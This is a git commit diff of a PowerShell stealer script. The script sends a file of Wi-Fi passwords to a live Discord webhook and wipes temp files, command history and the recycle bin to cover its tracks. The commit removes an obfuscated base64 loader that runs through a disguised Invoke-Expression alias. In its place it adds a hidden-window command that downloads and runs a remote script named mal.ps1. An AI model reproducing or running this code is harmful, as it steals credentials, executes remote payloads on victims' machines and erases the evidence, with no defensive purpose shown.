96afa704edbb7b9730b5f5771c76eee277b77834
rude90 <115774095+rude90@users.noreply.github.com>
2023-11-17 08:03:21 +0500

    Update FOR-AAA.ps1

--- FOR-AAA.ps1
+++ FOR-AAA.ps1
@@ -120,52 +120,23 @@ function Upload-Discord {
   }
 }
 
-
 if (-not ([string]::IsNullOrEmpty("https://discord.com/api/webhooks/1115463743707545630/WkkDi7gAXmr1qoufS_9Hr4qz509C8eKFlPkvyA4m4u_g7zxHv91Dls_BbbGeTVYhbGAC"))){Upload-Discord -file "$env:TEMP/--wifi-pass.txt"}
-
-
-
-
-
-
- 
-
-
-
-
-
 ############################################################################################################################################################
-
 function Clean-Exfil { 
-
 # empty temp folder
 rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
-
 # delete run box history
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 
-
 # Delete powershell history
 Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
-
 # Empty recycle bin
 Clear-RecycleBin -Force -ErrorAction SilentlyContinue
-
 }
-
 ############################################################################################################################################################
-
 if (-not ([string]::IsNullOrEmpty($ce))){Clean-Exfil}
-
-
-
 RI $env:TEMP/--wifi-pass.txt
+powershell.exe -Windowstyle Hidden -C "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rude90/Power--Shell/main/mal.ps1');"
 
-
-
-$best64code = "K0gCNUGel5Ca0xWYlhUe0lmc1NWZTx1YpxmY1BFXzJXZzVFX6MEIuVGZklGSgcXLgUGel5CbsVGazJXZ39GcK0QZ4VmLoRHbhVGS5RXayV3YlNFXjlGbiVHUcNnclNXVcpzQg8WLgUGel5Ca0xWYlhUe0lmc1NWZT9ibpFWbvMHZh9Gb5FGUvATOlRWdy9SbvNmL05WZ052bjJXZzVnY1hGdpdmL3Fmcv8iOzBHd0hGIgkmc11CIydXagM3chBXeiBCcl1CIuVGZklGSgUGb5R3c39GZul2VtACbsVGazJXZ39Gc/u77" ;
-$base64 = $best64code.ToCharArray() ; [array]::Reverse($base64) ; -join $base64 2>&1> $null ;
-$lOAdCode = [SYSteM.text.EnCoDING]::UTF8.GETStriNG([sYsTeM.CONvERt]::FrOMbAse64sTRINg("$BasE64")) ;
-$PWN = "I"+"n"+"v"+"O"+"K"+"e"+"-"+"e"+"X"+"P"+"R"+"e"+"s"+"S"+"I"+"o"+"n" ; neW-aLIas -NAME pWN -VALUe $PWN -FOrcE ; pwn $LoadCode ;
 
 
 
